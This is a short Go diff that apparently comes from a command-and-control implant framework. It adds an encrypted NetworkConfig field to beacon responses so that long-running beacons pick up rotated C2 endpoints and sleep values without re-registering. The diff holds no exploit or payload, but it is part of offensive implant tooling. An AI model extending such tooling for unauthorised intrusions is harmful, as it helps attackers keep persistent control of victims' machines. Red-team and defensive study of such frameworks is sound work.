@@ -123,6 +123,13 @@ type BeaconResponse struct {
 	// number. The agent fast-forwards its local sequence if it has fallen
 	// behind (e.g. after a state reset) rather than blindly jumping.
 	LastSeq uint64 `json:"last_seq,omitempty"`
+
+	// NetworkConfig carries the encrypted over-the-wire network config
+	// (same blob shape as the registration response). It is attached to an
+	// encrypted beacon response when the operator's live config changed or a
+	// periodic refresh is due, so a long-running beacon picks up rotated C2
+	// endpoints / sleep values without re-registering. Empty means "no change".
+	NetworkConfig string `json:"network_config,omitempty"`
 }
 
 // RelayedTask carries tasks destined for child agents (P2P).
